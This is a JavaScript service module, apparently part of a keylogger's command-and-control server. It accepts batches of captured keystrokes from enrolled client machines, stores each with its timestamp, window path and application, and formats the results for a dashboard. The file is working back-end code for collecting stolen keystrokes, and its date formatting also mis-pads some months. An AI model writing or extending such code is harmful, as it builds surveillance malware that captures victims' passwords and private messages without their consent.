'use strict'

const Client = require('../models/Client')
const Command = require('../models/Command')
const commandDao = require('../dao/commandDao')
const clientDao = require('../dao/clientDao')
const clientService = require('./clientService')
const keylogsDao = require('../dao/keylogsDao')
//const { now } = require('sequelize/types/lib/utils')

const keylogsService = {

    addKeylogs: async function ({ uuid, data }) {

        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist
        if (!(client instanceof Client)) {
            return { isAdded: false }
        }

        for await (const keylog of data) {
            const datetime = new Date(keylog.timestamp * 1000)
            const path = keylog.path
            const application = keylog.application
            const logs = keylog.logs

            const ret = await keylogsDao.insertOne({
                clientId: client.id,
                datetime: datetime,
                path: path,
                application: application,
                logs: logs
            })
        }

        return { isAdded: true }
    },
    findAllByClientId: async function (clientId) {

        const keylogs = await keylogsDao.findAllByClientId(clientId)
        return keylogs
    },
    getDataDashboard: async function () {

        const keylogs = await keylogsDao.getDataDashboard()

        for (let k in keylogs) {
            let date = keylogs[k].getDataValue('date')
            date = date.getFullYear() + '-' + (date.getMonth() <= 9 ? '0' : '') + (date.getMonth() + 1) + '-' + date.getDate()
            keylogs[k].setDataValue('date', date)
        }

        return keylogs
    }
}

module.exports = keylogsService